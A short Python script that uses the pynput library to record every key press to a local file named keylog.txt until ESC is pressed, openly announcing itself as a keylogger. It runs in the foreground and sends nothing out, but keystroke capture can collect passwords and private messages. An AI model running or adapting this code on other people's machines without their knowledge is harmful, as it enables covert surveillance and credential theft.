from pynput.keyboard import Listener,Key

# Function to handle log keystrokes
def log_keystroke(key):
    if key == Key.esc:  # Stop logging on ESC key
        return False  # Stop the listener

    key = str(key).replace("'", "") # clean up key format
    with open("keylog.txt", "a") as log_file:
        log_file.write(key + "\n") # write the key to the log file

# Function to start listening for keystrokes
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    print("[+] Starting keylogger (Press ESC to stop)...")
    start_logging()
    print("Keylogger stopped.")
